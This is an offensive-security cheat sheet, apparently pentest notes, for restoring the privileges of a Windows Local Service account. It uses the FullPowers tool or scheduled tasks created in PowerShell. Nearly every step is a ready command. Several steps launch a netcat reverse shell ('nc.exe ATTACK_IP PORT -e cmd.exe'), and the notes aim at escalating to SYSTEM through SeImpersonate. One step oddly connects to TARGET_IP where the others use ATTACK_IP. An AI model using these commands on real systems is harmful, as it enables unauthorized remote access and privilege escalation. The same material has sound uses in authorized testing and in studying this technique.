# Recover privileges of NT Authority Local Service Account

## Source: https://itm4n.github.io/localservice-privileges/ and https://github.com/itm4n/FullPowers

### Steps:

1) Check your privileges

        whoami /priv

2) Run the FullPowers tool to regain the privileges of the NT Authority Local Service account we are currently on

        FullPowers.exe -c "C:\temp\nc64.exe ATTACK_IP PORT -e powershell" -z

### OR

        FullPowers -x

3) Check your privileges again

        whoami /priv

If the bug was successful, then you can use the SeImpersonate Privilege or any other sensitive one to go for privilege escalation to SYSTEM user

## Manual Exploitation

### 1) Create a scheduled task to make a connection back to our listener

        $TaskAction = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-Exec Bypass -Command '"C:\wamp\www\nc.exe ATTACK_IP PORT -e cmd.exe'""

### 2) Give our Scheduled Task a name and register it on the system

        Register-ScheduledTask -Action $TaskAction -TaskName "GrantPerm"

### 3) Start our newly created Scheduled Task

        Start-ScheduledTask -TaskName "GrantPerm"

### 4) Create a list of privileges

        [System.String[]]$Privs = "SeAssignPrimaryTokenPrivilege", "SeAuditPrivilege", "SeChangeNotifyPrivilege", "SeCreateGlobalPrivilege", "SeImpersonatePrivilege", "SeIncreaseWorkingSetPrivilege"

### 5) Create a Principal for the task

        $TaskPrincipal = New-ScheduledTaskPrincipal -UserId "LOCALSERVICE" -LogonType ServiceAccount -RequiredPrivilege $Privs

### 6) Create an action for the task

        $TaskAction = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-Exec Bypass -Command '"C:\wamp\www\nc.exe TARGET_IP PORT -e cmd.exe'""

### 7) Create the task

        Register-ScheduledTask -Action $TaskAction -TaskName "GrantAllPerms" -Principal $TaskPrincipal

### 8) Start the task

        Start-ScheduledTask -TaskName "GrantAllPerms"
